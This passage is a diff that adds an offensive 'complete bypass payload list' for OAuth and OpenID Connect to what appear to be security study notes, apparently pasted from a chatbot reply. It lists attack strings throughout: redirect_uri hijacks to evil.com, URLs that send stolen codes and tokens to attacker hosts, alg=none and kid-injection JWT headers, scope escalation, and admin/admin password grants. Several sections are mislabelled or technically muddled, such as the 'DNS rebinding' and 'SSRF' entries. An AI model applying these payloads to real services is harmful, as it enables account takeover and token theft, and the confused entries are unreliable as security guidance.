@@ -966,3 +966,409 @@ Admin panel:
 ![](images/2%20-%20OAuth%20account%20hijacking%20via%20redirect_uri/14.png)
   
 ![](images/2%20-%20OAuth%20account%20hijacking%20via%20redirect_uri/15.png)
+
+Below is the **OAuth Misconfiguration – Complete Bypass Payload List**, in the **same table-style format** as your previous (SSTI / Command Injection / Directory Traversal / Insecure Deserialization etc.).
+All payloads are offensive-security testing payloads used for **OAuth abuse, account takeover, redirect hijacking, token forgery, scope escalation, PKCE bypass, OpenID issues**, etc.
+
+---
+
+# ⭐ **OAuth Misconfiguration – Complete Bypass Payload List**
+
+---
+
+# **1. OAuth Redirect URI Manipulation**
+
+### **Open Redirect Payloads**
+
+```
+https://auth.com/oauth?redirect_uri=https://evil.com
+https://auth.com/oauth?redirect_uri=https://trusted.com.evil.com
+https://auth.com/oauth?redirect_uri=https://trusted.com%2F%2Fevil.com
+```
+
+### **Double Encoding**
+
+```
+redirect_uri=https%253A%252F%252Fevil.com
+```
+
+### **Fragment Injection**
+
+```
+redirect_uri=https://trusted.com/#https://evil.com
+```
+
+### **DNS Rebinding**
+
+```
+redirect_uri=https://attacker.burpcollab.net
+```
+
+---
+
+# **2. OAuth `state` Parameter Bypass**
+
+### **Missing / Empty State**
+
+```
+&state=
+```
+
+### **Predictable State**
+
+```
+&state=123
+```
+
+### **Replay/Reuse of State**
+
+```
+Use previously captured state to force login on victim.
+```
+
+### **State Injection**
+
+```
+&state=xyz&redirect_uri=https://evil.com
+```
+
+---
+
+# **3. Authorization Code Interception**
+
+### **Code Leaking via Redirect**
+
+```
+https://victim.com/callback?code=abc123
+```
+
+### **Code Reuse**
+
+```
+Reuse intercepted auth code before legitimate user redeems it.
+```
+
+### **Code-in-URL via Open Redirect**
+
+```
+https://auth.com/authorize?redirect_uri=https://evil.com/path?code=<steal>
+```
+
+---
+
+# **4. PKCE Bypass Payloads**
+
+### **Plain PKCE (no challenge)**
+
+```
+code_challenge_method=plain
+code_challenge=123
+```
+
+### **Predictable code_verifier**
+
+```
+code_verifier=111111111111111111111111111111111111
+```
+
+### **Weak PKCE (same challenge/verifier)**
+
+```
+code_challenge=abc
+code_verifier=abc
+```
+
+---
+
+# **5. Scope Escalation Payloads**
+
+### **Add Admin Scopes**
+
+```
+scope=openid%20email%20profile%20admin
+```
+
+### **Full Privilege Escalation**
+
+```
+scope=read write delete sudo
+```
+
+### **Wildcard Scope Abuse**
+
+```
+scope=*
+```
+
+---
+
+# **6. Token Substitution / Manipulation**
+
+### **Replacing access_token**
+
+```
+access_token=ATTACKER_ACCESS_TOKEN
+```
+
+### **Use of Bearer Token in Header**
+
+```
+Authorization: Bearer <stolen-token>
+```
+
+### **Injecting ID Token**
+
+```
+id_token=<attacker-JWT>
+```
+
+---
+
+# **7. JWT Manipulation (ID Token Abuse)**
+
+### **alg=none bypass**
+
+```
+{"alg":"none"}
+```
+
+### **Kid Header Injection**
+
+```
+{"kid":"../../../../../../dev/null"}
+```
+
+### **Algorithm Confusion Attack**
+
+```
+Change RS256 → HS256 and sign with public key
+```
+
+### **JWT Claim Injection**
+
+```
+{"sub":"victimID","email":"victim@example.com","admin":true}
+```
+
+---
+
+# **8. OAuth Implicit Flow Abuse**
+
+### **Token Exposure in URL Fragment**
+
+```
+https://victim.com#access_token=<steal>
+```
+
+### **Silent Login Abuse (iframe)**
+
+```
+<iframe src="https://auth.com/implicit?client_id=..."></iframe>
+```
+
+---
+
+# **9. Unvalidated `client_id` Abuse**
+
+### **Fake Application Impersonation**
+
+```
+client_id=attacker-app
+```
+
+### **Client Spoofing**
+
+```
+client_id=official-client
+```
+
+---
+
+# **10. OAuth Device Flow Manipulation**
+
+### **Brute-force user_code**
+
+```
+AAAA-AAAA
+BBBB-BBBB
+```
+
+### **Reuse expired user_code**
+
+```
+Submit expired but still accepted user_code
+```
+
+---
+
+# **11. Account Takeover VIA Misconfigured Login Linking**
+
+### **Account Linking Hijack**
+
+```
+Login to victim’s account using OAuth provider not properly verified.
+```
+
+### **Email Mismatch Exploit**
+
+```
+Provider returns attacker@example.com but app trusts victim@example.com
+```
+
+---
+
+# **12. Misconfigured Token Introspection**
+
+### **Unprotected Introspection Endpoint**
+
+```
+POST /introspect
+token=<victim-token>
+```
+
+### **Attacker supplies fake token**
+
+```
+token=FORGEDTOKEN123
+```
+
+---
+
+# **13. Refresh Token Abuse**
+
+### **Refresh Token Prediction**
+
+```
+refresh_token=11111111111111111111
+```
+
+### **Infinite Refresh (no expiry)**
+
+```
+Use refresh token indefinitely to keep generating valid access tokens.
+```
+
+---
+
+# **14. OAuth Password Grant Abuse (legacy)**
+
+### **Direct Credential Harvesting**
+
+```
+POST /token
+grant_type=password&username=admin&password=admin
+```
+
+### **Password Grant with Missing Client Secret**
+
+```
+grant_type=password&client_secret=
+```
+
+---
+
+# **15. SSRF via Token Endpoint**
+
+### **Custom Token Endpoint**
+
+```
+token_endpoint=https://attacker.com/collect
+```
+
+### **Client sends tokens to attacker-controlled URL**
+
+```
+POST https://evil.com/oauth/token
+```
+
+---
+
+# **16. OpenID Connect Vulnerabilities**
+
+### **Nonce Missing / Weak**
+
+```
+nonce=123
+```
+
+### **Fake Issuer**
+
+```
+"iss": "https://evil.com"
+```
+
+### **Ignored aud Claim**
+
+```
+aud="attacker-client"
+```
+
+---
+
+# **17. OAuth Token Leakage via Logs / Referrers**
+
+### **Using redirect_uri with external resources**
+
+```
+redirect_uri=https://trusted.com?img=https://evil.com/collect?token=<token>
+```
+
+### **Token in Referer**
+
+Load third-party script that leaks token in URL.
+
+---
+
+# **18. CORS + OAuth Token Theft**
+
+### **Misconfigured CORS**
+
+```
+Access-Control-Allow-Origin: *
+```
+
+Allows JavaScript to steal:
+
+```
+Authorization: Bearer <token>
+```
+
+---
+
+# **19. OAuth → CSRF Chaining**
+
+### **Auto-submit form to trigger OAuth login**
+
+```
+<form action="https://auth.com/oauth" method="GET">
+```
+
+### **Forcing victim login into attacker-controlled account**
+
+```
+redirect_uri=https://app.com/callback?linkAccount=attacker
+```
+
+---
+
+# **20. Real-World OAuth Vulnerable Patterns**
+
+### **Misconfigured Google OAuth**
+
+```
+redirect_uri=https://google.com.evil.com
+```
+
+### **Facebook OAuth Misconfiguration**
+
+```
+redirect_uri=https://facebook.com/evil?code=<steal>
+```
+
+### **Microsoft OIDC Misconfiguration**
+
+```
+tenant=common (allows anyone to authenticate)
+```
+
+---
